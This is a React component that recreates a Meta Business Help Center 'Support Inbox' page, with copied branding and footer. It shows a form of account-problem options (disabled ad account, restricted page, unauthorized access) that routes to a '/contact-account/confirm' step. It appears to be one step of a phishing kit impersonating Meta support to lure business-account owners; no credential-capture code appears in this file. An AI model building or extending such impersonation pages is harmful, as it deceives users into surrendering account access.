import { logo, search } from './Publics/images/images'
import { Link, useNavigate} from 'react-router-dom'
import React, { useState } from 'react';
import { Input, Radio, Space, Form, Button } from 'antd';



const Step_buiness = () => {

    const navigate = useNavigate();

    const [value, setValue] = useState(1);
    const onChange = (e) => {
        setValue(e.target.value);
    };

    const onFinish = (values) => {

        navigate('/contact-account/confirm');

    };

    return (
        <div className="business">

            <div className="top-header">
                <div className="container">
                    <img src={logo} width="70" className="metalogo" alt=''/>
                    <p className="metahead">Support Inbox</p>
                    <img src={search} width="100%" className="searchicon" alt=''/>
                </div>
            </div>
            <div className="masheader">
                <div className="wrapper">
                    <div className="container">
                        <p className="businesshelp" >
                            Meta Business Help Center </p>
                        <p className="businesshelpcenter">How can we help you?</p>
                    </div>
                </div>
            </div>

            <div className="main">

                <div className="title-page">
                    <p><b>How can we help?</b></p>
                    <p>We need more information to address your issue. This form will only take a few minutes.</p>
                </div>

                <div className="form select-form col-md-4 col-12">
                    <p><b>Most common issues</b></p>

                    <Form
                        name="basic"
                        initialValues={{
                        remember: true,
                        }}
                        onFinish={onFinish}
                        autoComplete="off"
                    >
                        <Radio.Group onChange={onChange} value={value}>
                            <Space direction="vertical">
                                <Radio value={1}>I have been blocked from using this feature</Radio>
                                <Radio value={2}>My fanpage is restricted (not violating any policy)</Radio>
                                <Radio value={3}>My ad account is disabled</Radio>
                                <Radio value={4}>I need help with a foiled payment</Radio>
                                <Radio value={5}>I think someone accessed my business without my permission.</Radio>
                                <Radio value={6}>Other issues</Radio>
                            </Space>
                        </Radio.Group>
                        <Form.Item 
                            className="btn butoni"
                        >
                            <Button
                                htmlType="submit"
                                style={{
                                    backgroundColor: "transparent",
                                    outline: "none",
                                    border: 'none',
                                    boxShadow: 'none',
                                    color: "#267df1",
                                    fontWeight: '700',
                                    fontSize:'1rem',
                                    width: '100%'
                                }}
                            >
                                Submit
                            </Button>
                        </Form.Item>
                        <p></p>
                    </Form>


                </div>

            </div>

            {/* FOOTER */}
            <div className="footer">
                <div className="container">
                    <img src={logo} alt="" className="logofooter"/>
                    <p className="nerlogofooter">
                        Facebook can help your large, medium or small business
                        grow. Get the latest news
                        for advertisers and more on our <Link to="#" style={{textDecoration: "none", color: "white"}}>Meta for Business Page.</Link></p>
                    <div className="row">
                        <div className="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p className="fontbold">Marketing on Facebook</p>
                                    <p>Success Stories</p>
                                    <p>Measurement</p>
                                    <p>Industries</p>
                                    <p>Inspiration</p>
                                    <p>Events</p>
                                    <p>News</p>
                                    <p>Site map</p>
                                </li>
                            </ul>
                        </div>
                        <div className="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p className="fontbold">Marketing objectives</p>
                                    <p>Build your presence</p>
                                    <p>Create awareness</p>
                                    <p>Drive discovery</p>
                                    <p>Generate leads</p>
                                    <p>Boost sales</p>
                                    <p>Earn loyalty</p>
                                </li>
                            </ul>
                        </div>
                        <div className="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p className="fontbold">Facebook Pages</p>
                                    <p>Get started with Pages</p>
                                    <p>Setting up your Page</p>
                                    <p>Manage your Facebook Page</p>
                                    <p>Promote your Page</p>
                                    <p>Messaging on your Page</p>
                                    <p>Page Insights</p>
                                </li>
                            </ul>
                        </div>
                        <div variant="dontshowonmobile " className="col-md-3 col-6">
                            <ul>
                                <li>
                                    <p className="fontbold">Facebook ads</p>
                                    <p>Get started with ads</p>
                                    <p>Buying Facebook ads</p>
                                    <p>Ad formats</p>
                                    <p>Ad placement</p>
                                    <p>Choose your audience</p>
                                    <p>Measure your ads</p>
                                    <p>Managing your ads</p>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>

            <div className="bottomfooter">
                <div className="container">
                    <ul>
                        <li>English (UK)</li>
                        <li>English (US)</li>
                        <li>Español</li>
                        <li>Português (Brasil)</li>
                        <li>Français (France)</li>
                        <li>Español (España)</li>
                        <li>More languages</li>
                    </ul>
                    <ul>
                        <li>© 2023 Meta</li>
                        <li>About</li>
                        <li>Developers</li>
                        <li>Careers</li>
                        <li>Privacy</li>
                        <li>Cookies</li>
                        <li>Terms</li>
                        <li>Help Centre</li>
                    </ul>
                </div>
            </div>

        </div>
    )
}

export default Step_buiness